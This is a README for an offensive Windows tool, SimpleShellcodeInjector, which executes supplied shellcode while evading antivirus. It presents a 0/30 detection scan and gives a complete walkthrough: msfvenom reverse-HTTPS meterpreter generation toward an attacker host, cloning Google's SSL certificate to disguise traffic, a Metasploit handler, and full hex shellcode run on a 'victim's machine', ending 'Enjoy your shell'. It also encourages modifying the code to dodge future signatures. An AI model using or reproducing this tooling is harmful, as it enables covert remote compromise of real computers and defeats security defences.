# SimpleShellcodeInjector (SSI)

[![N|Solid](https://cdn.pixabay.com/photo/2015/12/06/17/53/fibonacci-1079776_960_720.jpg)](https://www.linkedin.com/in/dimopouloselias)
## Description
SimpleShellcodeInjector or SSI receives as an argument a shellcode in hex and executes it. 
It DOES NOT inject the shellcode in a third party application and it stays under the radar for tools like Get-InjectedThread.  
At the moment, many antivirus solutions will not detect it, even when you execute a meterpreter's shellcode, without obfuscation.   
*Let me note that, although you can use SSI in order to recieve a meterpreter, it is NOT a stager for metasploit. It just executes the shellcode you feed it.*
## Antivirus Detection (Rate: 0/30)
### Activly Tests
At the moment, it has been actively tested against the following solutions (default settings - fully updated) and it returned a reverse https meterpreter with success:

  - Windows Defender
  - Symantec Endpoint Protection
  - Kaspersky
  
 Victim's OS: Windows 10 64 bit
### AntiScan
*url: https://antiscan.me/scan/result?id=9c3c0d892c3a0e84f8cf8bb5843b5591*

Detection rate **(0/30)** 
Scan Date: **2018-08-16 13:11:00**
 - Ad-Aware - Antivirus: - **Clean**
 - AhnLab - V3 - Light: - **Clean**
 - Arcavir: - **Clean**
 - Avast: - **Clean**
 - AVG: - **Clean**
 - Avira: - **Clean**
 - 360 - Total - Security: - **Clean**
 - BitDefender: - **Clean**
 - BullGuard: - **Clean**
 - ClamAV: - **Clean**
 - DrWeb: - **Clean**
 - Emsisoft: - **Clean**
 - eScan: - **Clean**
 - Eset - NOD32: - **Clean**
 - Fortinet: - **Clean**
 - F-PROT: - **Clean**
 - F-Secure: - **Clean**
 - G - Data: - **Clean**
 - IKARUS: - **Clean**
 - K7: - **Clean**
 - Kaspersky: - **Clean**
 - Malwarebytes: - **Clean**
 - McAfee: - **Clean**
 - Norton - Security: - **Clean**
 - Sophos: - **Clean**
 - TrustPort: - **Clean**
 - VBA32: - **Clean**
 - Windows - Defender: - **Clean**
 - Zillya: - **Clean**
 - Zone - Alarm: - **Clean**

## Example Usage

A reverse https meterpreter example is being provided below. However, you can use any shellcode you like.

**Important Note:**  Although some security solutions like Windows Defender do not detect the SSI as a virus, they can detect other factors which are not related to the SSI.For example they might detect metasploit's default certificate or the reverse tcp meterpreter. 

**Attacker's Machine:**
*Generate payload for SSI:*
```sh
$ i686-w64-mingw32-gcc SimpleShellcodeInjector.c -o ssi.exe
$ msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o msf.txt
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 545 bytes
Final size of c file: 2315 bytes
Saved as: msf.txt

$ cat msf.txt|grep -v unsigned|sed "s/\"\\\x//g"|sed "s/\\\x//g"|sed "s/\"//g"|sed ':a;N;$!ba;s/\n//g'|sed "s/;//g"

fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368bb010000e8500100002f626a5468507451456358326a314b4c562d4b483955776e4d466970474165444b4e702d336e754f3776474a69785f58436b3957444442566a78544c7743536d736f68744d4476754a4a77746d4953624d774f77414a6a6f555564575f61476532764f314a534c364347424c6278535f7a6645447043494d50786443595f63326e735831775f4651316e33532d484f34644a376f68424c4832574173576d687762686533726c6866465177523557505465324366502d654f666a62414834597100506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde8440000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff312e322e332e3400bbf0b5a2566a0053ffd5
```
*Prepare Metasploit - SSL impersonation:*
```sh
$ msfconsole
msf exploit(multi/handler) > use auxiliary/gather/impersonate_ssl
msf auxiliary(gather/impersonate_ssl) > set RHOST www.google.com
RHOST => www.google.com
sf auxiliary(gather/impersonate_ssl) > run

[*] www.google.com:443 - Connecting to www.google.com:443
[*] www.google.com:443 - Copying certificate from www.google.com:443
/C=US/ST=California/L=Mountain View/O=Google LLC/CN=www.google.com 
[*] www.google.com:443 - Beginning export of certificate files
[*] www.google.com:443 - Creating looted key/crt/pem files for www.google.com:443
[+] www.google.com:443 - key: /home/gweeperx/.msf4/loot/20180816131826_default_216.58.212.36_www.google.com_k_829605.key
[+] www.google.com:443 - crt: /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_c_997519.crt
[+] www.google.com:443 - pem: /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem
[*] Auxiliary module execution completed



```

*Prepare Metasploit - Handler:*

```sh
msf auxiliary(gather/impersonate_ssl) > use exploit/multi/handler 
msf exploit(multi/handler) > set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
msf exploit(multi/handler) > set HandlerSSLCert /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem
HandlerSSLCert => /home/gweeperx/.msf4/loot/20180816131827_default_216.58.212.36_www.google.com_p_032017.pem
msf exploit(multi/handler) > set LHOST 0.0.0.0
LHOST => 0.0.0.0
msf exploit(multi/handler) > set LPORT 443
LPORT => 443
msf exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:443 

```
**Victim's Machine:**
```sh
C:\Users\gweeperx\Desktop>ssi.exe fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d01c7e2f252578b52108b4a3c8b4c1178e34801d1518b592001d38b4918e33a498b348b01d631ffacc1cf0d01c738e075f6037df83b7d2475e4588b582401d3668b0c4b8b581c01d38b048b01d0894424245b5b61595a51ffe05f5f5a8b12eb8d5d686e6574006877696e6954684c772607ffd531db5353535353683a5679a7ffd553536a03535368bb010000e81a0100002f303430705247463070385f53396450306959436451676264466553636e6c4346787333785a4e4a4a355072346d6430634b6f68366e64374d634973644b4239646249463958534c3435325f76456c74785472556452644b6e77447275547762767630794b5069796d544c726751395f2d326e7a626f30336530527255346848664961694a6f644f634a00506857899fc6ffd589c653680032e08453535357535668eb552e3bffd5966a0a5f688033000089e06a04506a1f566875469e86ffd55353535356682d06187bffd585c0751468881300006844f035e0ffd54f75cde84a0000006a4068001000006800004000536858a453e5ffd593535389e7576800200000535668129689e2ffd585c074cf8b0701c385c075e558c35fe86bffffff31302e31302e3131332e32303800bbf0b5a2566a0053ffd5
 +-+-+-+ +-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
 |S|S|I| |(|S|i|m|p|l|e| |S|h|e|l|l|c|o|d|e| |I|n|j|e|c|t|o|r|)|
 +-+-+-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+ +-+-+-+-+-+-+-+-+-+
 |b|y| |g|w|e|e|p|e|r|x|
 +-+-+ +-+-+-+-+-+-+-+-+


Ready? Go!
```
* **Note**: I am hiding the cmd window, so you will see not output from the SSI*

*Enjoy your shell.*

## Notes
I tried to make it as simple as i could, in hope that it will be easy for anyone to make a few changes in the code and avoid AV signatures which will arise after the release of this tool.

### DON'T forget to wear your white hat before you use it.  ;-)


